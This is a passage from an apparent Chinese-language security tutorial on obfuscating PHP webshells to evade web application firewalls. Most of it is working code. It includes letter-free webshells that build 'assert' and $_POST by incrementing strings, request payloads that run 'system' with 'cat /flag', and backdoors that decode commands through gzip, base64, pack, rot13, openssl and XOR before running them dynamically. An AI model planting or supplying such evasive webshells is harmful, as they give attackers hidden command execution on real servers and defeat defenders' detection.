+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;   <span style="color:#828b96;font-style:italic">//得到&#34;R&#34;，此时$__=&#34;R&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$___</span> <span style="color:#ff636f">.=</span> <span style="color:#58a1dd">$__</span>;   <span style="color:#828b96;font-style:italic">//$___=&#34;ASSER&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;   <span style="color:#828b96;font-style:italic">//得到&#34;T&#34;，此时$__=&#34;T&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$___</span> <span style="color:#ff636f">.=</span> <span style="color:#58a1dd">$__</span>;   <span style="color:#828b96;font-style:italic">//$___=&#34;ASSERT&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$__</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$_</span>;   <span style="color:#828b96;font-style:italic">//$__=&#34;A&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$____</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;_&#34;</span>;   <span style="color:#828b96;font-style:italic">//$____=&#34;_&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;   <span style="color:#828b96;font-style:italic">//得到&#34;P&#34;，此时$__=&#34;P&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$____</span> <span style="color:#ff636f">.=</span> <span style="color:#58a1dd">$__</span>;   <span style="color:#828b96;font-style:italic">//$____=&#34;_P&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$__</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$_</span>;   <span style="color:#828b96;font-style:italic">//$__=&#34;A&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;   <span style="color:#828b96;font-style:italic">//得到&#34;O&#34;，此时$__=&#34;O&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$____</span> <span style="color:#ff636f">.=</span> <span style="color:#58a1dd">$__</span>;   <span style="color:#828b96;font-style:italic">//$____=&#34;_PO&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;   <span style="color:#828b96;font-style:italic">//得到&#34;S&#34;，此时$__=&#34;S&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$____</span> <span style="color:#ff636f">.=</span> <span style="color:#58a1dd">$__</span>;   <span style="color:#828b96;font-style:italic">//$____=&#34;_POS&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;   <span style="color:#828b96;font-style:italic">//得到&#34;T&#34;，此时$__=&#34;T&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$____</span> <span style="color:#ff636f">.=</span> <span style="color:#58a1dd">$__</span>;   <span style="color:#828b96;font-style:italic">//$____=&#34;_POST&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$_</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$$____</span>;   <span style="color:#828b96;font-style:italic">//$_=$_POST
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$___</span>(<span style="color:#58a1dd">$_</span>[<span style="color:#58a1dd">_</span>]);   <span style="color:#828b96;font-style:italic">//ASSERT($POST[_])
+</span></span></span></code></pre></div><p>强化</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$__</span><span style="color:#ff636f">=++</span><span style="color:#58a1dd">$____</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">--</span><span style="color:#58a1dd">$__</span>;
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$____</span><span style="color:#ff636f">=</span>((<span style="color:#58a1dd">_</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">_</span>)<span style="color:#ff636f">.</span><span style="color:#a6be9d">&#39;&#39;</span>){<span style="color:#58a1dd">$__</span>};<span style="color:#828b96;font-style:italic">//NAN
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$_____</span><span style="color:#ff636f">=++</span><span style="color:#58a1dd">$____</span>;<span style="color:#828b96;font-style:italic">//O
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">++</span><span style="color:#58a1dd">$____</span>;
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$______</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$____</span>;<span style="color:#828b96;font-style:italic">//p
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">++</span><span style="color:#58a1dd">$____</span>;<span style="color:#ff636f">++</span><span style="color:#58a1dd">$____</span>;<span style="color:#ff636f">++</span><span style="color:#58a1dd">$____</span>;
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$_______</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$____</span>;<span style="color:#828b96;font-style:italic">//S
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">++</span><span style="color:#58a1dd">$____</span>;
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$________</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$____</span>;<span style="color:#828b96;font-style:italic">//T
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$_________</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$______</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">$_____</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">$_______</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">$________</span>;<span style="color:#828b96;font-style:italic">//POST
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$_________</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#39;_&#39;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">$_________</span>;<span style="color:#828b96;font-style:italic">//_POST
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">${$_________}</span>{<span style="color:#58a1dd">_</span>}(<span style="color:#58a1dd">${$_________}</span>{<span style="color:#58a1dd">__</span>});<span style="color:#828b96;font-style:italic">//$_POST[_]($_POST[__])
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">shell</span><span style="color:#ff636f">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">?</span><span style="color:#58a1dd">cmd</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$__</span><span style="color:#ff636f">=++</span><span style="color:#58a1dd">$____</span>;<span style="color:#ff636f">--</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$__</span>;<span style="color:#58a1dd">$____</span><span style="color:#ff636f">=</span>((<span style="color:#58a1dd">_</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">_</span>)<span style="color:#ff636f">.</span><span style="color:#a6be9d">&#39;&#39;</span>){<span style="color:#58a1dd">$__</span>};<span style="color:#58a1dd">$_____</span><span style="color:#ff636f">=++</span><span style="color:#58a1dd">$____</span>;<span style="color:#ff636f">++</span><span style="color:#58a1dd">$____</span>;<span style="color:#58a1dd">$______</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$____</span>;<span style="color:#ff636f">++</span><span style="color:#58a1dd">$____</span>;<span style="color:#ff636f">++</span><span style="color:#58a1dd">$____</span>;<span style="color:#ff636f">++</span><span style="color:#58a1dd">$____</span>;<span style="color:#58a1dd">$___</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">____</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$____</span>;<span style="color:#ff636f">++</span><span style="color:#58a1dd">$____</span>;<span style="color:#58a1dd">$________</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$____</span>;<span style="color:#58a1dd">$_________</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$______</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">$_____</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">$_______</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">$________</span>;<span style="color:#58a1dd">$_________</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">_&#39;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">$_________</span>;<span style="color:#58a1dd">${$_________}</span>{<span style="color:#58a1dd">_</span>}(<span style="color:#58a1dd">${$_________}</span>{<span style="color:#58a1dd">__</span>});<span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">_</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">system</span><span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">__</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">cat</span> <span style="color:#ff636f">/</span><span style="color:#58a1dd">flag</span></span></span></code></pre></div><p>究极强化</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$_</span><span style="color:#ff636f">=</span>(<span style="color:#58a1dd">_</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">_</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">_</span>)[<span style="color:#58a1dd">_</span>]; <span style="color:#828b96;font-style:italic">//N
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$_</span><span style="color:#ff636f">++</span>; <span style="color:#828b96;font-style:italic">//o
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$__</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$_</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">$_</span><span style="color:#ff636f">++</span>;<span style="color:#828b96;font-style:italic">//PO
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$_</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$_</span><span style="color:#ff636f">++</span>;
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$_</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">_</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">$__</span><span style="color:#ff636f">.++</span><span style="color:#58a1dd">$_</span><span style="color:#ff636f">.++</span><span style="color:#58a1dd">$_</span>;<span style="color:#828b96;font-style:italic">//_POST
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$$_</span>[<span style="color:#58a1dd">_</span>](<span style="color:#58a1dd">$$_</span>[<span style="color:#58a1dd">__</span>]);<span style="color:#828b96;font-style:italic">//$_POST[$_POST[__]] 注意。这里的__也可以替换成%FA这样的特殊字符减少一个字符占用
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">cmd</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$_</span><span style="color:#ff636f">=</span>(<span style="color:#58a1dd">_</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">_</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">_</span>)[<span style="color:#58a1dd">_</span>];<span style="color:#58a1dd">$_</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span>;$<span style="color:#ff636f">%</span><span style="color:#58a1dd">FA</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$_</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">$_</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span>;<span style="color:#58a1dd">$_</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span>;<span style="color:#58a1dd">$_</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span>;<span style="color:#58a1dd">$_</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">_</span><span style="color:#ff636f">.</span>$<span style="color:#ff636f">%</span><span style="color:#58a1dd">FA</span><span style="color:#ff636f">.%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span><span style="color:#58a1dd">$_</span><span style="color:#ff636f">.%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">2</span><span style="color:#58a1dd">B</span><span style="color:#58a1dd">$_</span>;<span style="color:#58a1dd">$$_</span>[<span style="color:#58a1dd">_</span>](<span style="color:#58a1dd">$$_</span>[<span style="color:#ff636f">%</span><span style="color:#58a1dd">FA</span>]);<span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">_</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">system</span><span style="color:#ff636f">&amp;%</span><span style="color:#58a1dd">FA</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">cat</span> <span style="color:#ff636f">/</span><span style="color:#58a1dd">flag</span></span></span></code></pre></div><h6 id="编码" class="heading-element"><span>0.0.0.1.2  编码</span>
+  <a href="#%e7%bc%96%e7%a0%81" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>可以使用一些函数处理字符串</p>
+<pre tabindex="0"><code>ucwords()  //把每个单词的首字符转换为大写
+ucfirst()  //首字符转换为大写
+trim()  //移除字符串两侧的字符
+substr_replace() //函数把字符串的一部分替换为另一个字符串
+substr()  //函数返回字符串的一部分
+strtr()  //函数转换字符串中特定的字符
+strtoupper()  //把所有字符转换为大写
+strtolower()  //把所有字符转换为小写
+strtok()  //函数把字符串分割为更小的字符串
+str_rot13()  //函数对字符串执行 ROT13 编码
+chr()  //从指定 ASCII 值返回字符
+hex2bin() //把十六进制值转换为 ASCII 字符
+bin2hex() //ASCII 字符的字符串转换为十六进制值
+gzcompress()、gzdeflate()、gzencode()  //字符串压缩
+gzuncompress()、gzinflate()、gzdecode()  //字符串解压
+base64_encode()  //base64编码
+base64_decode()  //nase64解码
+pack()  //数据装入一个二进制字符串
+unpack()  //从二进制字符串对数据进行解包</code></pre><p>####### gzcompress系列</p>
+<p>可以看到这里解压后的内容变成了一堆乱码，在这里值得注意的是，如果我们利用方式依旧像base64一样是行不通，因为这一串乱码是无法提过字符串的形式准确的返回给服务端的</p>
+<pre tabindex="0"><code>&lt;?php
+$a = gzcompress(&#34;abc&#34;);
+echo &#34;压缩后: &#34;.$a;
+
+echo &#34;&lt;br&gt;解压后: &#34;.gzuncompress($a);
+?&gt;</code></pre><p>再次利用base64编码，如果没有经验的兄弟可能会认为这是多此一举，我直接用base64不就完了么，其实在真正的对抗当中，很多安全设备是可以识别base64编码的，可以自动解码判断解码后的内容。这一不其实就是为了，防止被解码后，内容被识别</p>
+<pre tabindex="0"><code>&lt;?php
+$func = gzuncompress(base64_decode($_GET[&#34;func&#34;]));
+$a = &#34;a&#34;;
+$s = &#34;s&#34;;
+$c=$a.$s.$_GET[&#34;func2&#34;];
+$c($func);
+?&gt;</code></pre><p>2.伪装成文件,以二进制方式传输</p>
+<p>这种发送迷惑性比较大，很少有waf会去识别二进制流中的内容，顶多就是一些简单的正则表达式去匹配一些字符串，乱码根本就不全去识别</p>
+<p>由于不能直接防止粘贴，因此需要在本地生成二进制文件</p>
+<pre tabindex="0"><code>&lt;?php
+$a = gzcompress(&#34;phpinfo();&#34;);
+file_put_contents(&#34;123.txt&#34;,$a);
+?&gt;</code></pre><p>在本地搭建一个上传页面只为获取数据包</p>
+<p>源码如下</p>
+<pre tabindex="0"><code>&lt;!DOCTYPE html&gt;
+&lt;html lang=&#34;zh-CN&#34;&gt;
+&lt;head&gt;
+    &lt;meta charset=&#34;utf-8&#34; /&gt;
+    &lt;title&gt;文件上传&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;form method=&#34;post&#34; enctype=&#34;multipart/form-data&#34; action=&#34;&#34;&gt;
+    &lt;input type=&#34;file&#34; name=&#34;filename&#34;&gt;
+    &lt;button type=&#34;submit&#34; &gt;上传&lt;/button&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+&lt;?php
+printf($_FILES);</code></pre><p>####### pack系列</p>
+<pre tabindex="0"><code>&lt;?php
+
+$func=pack(&#34;H14&#34;,&#34;706870696e666f&#34;);
+
+$a = &#34;a&#34;;
+$s = &#34;s&#34;;
+$c=$a.$s.$_GET[&#34;func2&#34;];
+$c($func);</code></pre><p>和hex2bin非常相似，其实pack函数比hex2bin强大的多</p>
+<pre tabindex="0"><code>unpack(format,data)
+
+data。规定被解包的二进制数据。
+
+format。规定在解包数据时所使用的格式。
+可能的值：
+
+a - NUL 填充的字符串
+A - SPACE 填充的字符串
+h - 十六进制字符串，低位在前
+H - 十六进制字符串，高位在前
+c - signed char
+C - unsigned char
+s - signed short（总是16位, machine 字节顺序）
+S - unsigned short（总是16位, machine 字节顺序）
+n - unsigned short（总是16位, big endian 字节顺序）
+v - unsigned short（总是16位, little endian 字节顺序）
+i - signed integer（取决于 machine 的大小和字节顺序）
+I - unsigned integer（取决于 machine 的大小和字节顺序）
+l - signed long（总是32位, machine 字节顺序）
+L - unsigned long（总是32位, machine 字节顺序）
+N - unsigned long（总是32位, big endian 字节顺序）
+V - unsigned long（总是32位, little endian 字节顺序）
+f - float（取决于 machine 的大小和表示）
+d - double（取决于 machine 的大小和表示）
+x - NUL 字节
+X - 备份一个字节
+Z - NUL 填充的字符串
+@ - NUL 填充绝对位置</code></pre><p>此函数提供了多中格式，可以将文件或者流量变得更加复杂</p>
+<p>####### base家族</p>
+<pre tabindex="0"><code>&lt;?php
+$a = &#39;d2hvYW1p&#39;;
+echo base64_decode($a).&#39;&#39;;
+?&gt;</code></pre><p>这种方法没有什么特别的用处，但是可以尝试base16或base32与其他方法搭配使用，效果是不错的！</p>
+<p>####### rot13</p>
+<pre tabindex="0"><code>&lt;?php
+$a=str_rot13(&#39;riny&#39;);
+$a($_POST[&#39;110&#39;]);
+?&gt;</code></pre><p>rot13对eavl函数进行加密，即&quot;riny&quot;（可以通过这种方式绕过函数的正则匹配）</p>
+<h6 id="加密函数与自定义加密函数" class="heading-element"><span>0.0.0.1.3  加密函数与自定义加密函数</span>
+  <a href="#%e5%8a%a0%e5%af%86%e5%87%bd%e6%95%b0%e4%b8%8e%e8%87%aa%e5%ae%9a%e4%b9%89%e5%8a%a0%e5%af%86%e5%87%bd%e6%95%b0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>####### openssl加密函数</p>
+<p>openssl_encrypt方法详解：</p>
+<pre tabindex="0"><code>openssl_encrypt($data, $method, $key, $options = 0, $iv = &#34;&#34;, &amp;$tag = NULL, $aad = &#34;&#34;, $tag_length = 16)
+
+参数：
+
+1.$data：加密明文
+2.$method：加密方法： 可以通过openssl_get_cipher_methods()获取有哪些加密方式
+3.$passwd：加密密钥[密码]
+4.$options：数据格式选项（可选）【选项有：】：0,OPENSSL_RAW_DATA=1,OPENSSL_ZERO_PADDING=2,OPENSSL_NO_PADDING=3
+5.$iv：密初始化向量（可选),需要注意：如果method为DES−ECB，则iv无需填写
+6.$tag：使用 AEAD 密码模式（GCM 或 CCM）时传引用的验证标签(可选)
+7.$aad：附加的验证数据。（可选）
+8.$tag_length：验证 tag 的长度。GCM 模式时，它的范围是 4 到 16(可选)</code></pre><p>openssl_decrypt方法详解:</p>
+<pre tabindex="0"><code>openssl_decrypt($data, $method, $password, $options = 1, $iv = &#34;&#34;, $tag = &#34;&#34;,  $aad = &#34;&#34;)
+参数：
+
+1.$data：要解密的加密消息。
+2.$method：解密方法：可以通过openssl_get_cipher_methods()获取有哪些解密方式
+3.$passwd：解密密钥[密码]
+4.$options：数据格式选项（可选）【选项有：】0,OPENSSL_RAW_DATA=1,OPENSSL_ZERO_PADDING=2,OPENSSL_NO_PADDING=3
+5.$iv：密初始化向量（可选),需要注意：如果method为DES−ECB，则iv无需填写
+6.$tag：AEAD密码模式下的身份验证标签(可选)
+7.$aad：附加的验证数据。（可选）</code></pre><p>函数基本使用:</p>
+<pre tabindex="0"><code>&lt;?php
+// 要加密的字符串
+$data = &#39;demo&#39;;
+// 密钥
+$key = &#39;123456&#39;;
+// 加密数据 &#39;AES-128-ECB&#39; 可以通过openssl_get_cipher_methods()获取
+$encrypt = openssl_encrypt($data, &#39;AES-128-ECB&#39;, $key, 0);
+echo &#34;加密后： &#34;.$encrypt;
+
+//密钥
+$key = &#39;123456&#39;;
+// 解密数据
+$decrypt = openssl_decrypt($encrypt, &#39;AES-128-ECB&#39;, $key, 0);
+echo &#34;&lt;br&gt;解密后： &#34;.$decrypt;</code></pre><p>实际利用:</p>
+<pre tabindex="0"><code>&lt;?php
+$key = &#34;password&#34;;
+
+$fun = openssl_decrypt($_GET[&#39;func&#39;], &#39;AES-128-ECB&#39;, $key, 0);
+$a = &#34;a&#34;;
+$s = &#34;s&#34;;
+$c=$a.$s.$_GET[&#34;func2&#34;];
+$c($fun);</code></pre><p>####### 自己写加密算法</p>
+<p>这种方式也比较简单，在很多ctf题目中都喜欢考与，或，取反，异或等进行绕过，其中可以直接用他们进行加密操作，当然如果学过密码学，一些简单的加密方式其实也行，凯莎密码，维吉尼亚密码，替换加密等都是可以尝试的，但是更复杂的算法还是建议，能使用现成的扩展就直接用，没必要花太多时间去研究这些算法。</p>
+<p>下面就以异或加密为例：</p>
+<pre tabindex="0"><code>&lt;?php
+
+$key = &#34;password&#34;;
+
+//ERsDHgEUC1hI
+$fun = base64_decode($_GET[&#39;func&#39;]);
+for($i=0;$i&lt;strlen($fun);$i++){
+    $fun[$i] = $fun[$i]^$key[$i+1&amp;7];
+}
+$a = &#34;a&#34;;
+$s = &#34;s&#34;;
+$c=$a.$s.$_GET[&#34;func2&#34;];
+$c($fun);</code></pre><h6 id="拼接" class="heading-element"><span>0.0.0.1.4  拼接</span>
+  <a href="#%e6%8b%bc%e6%8e%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
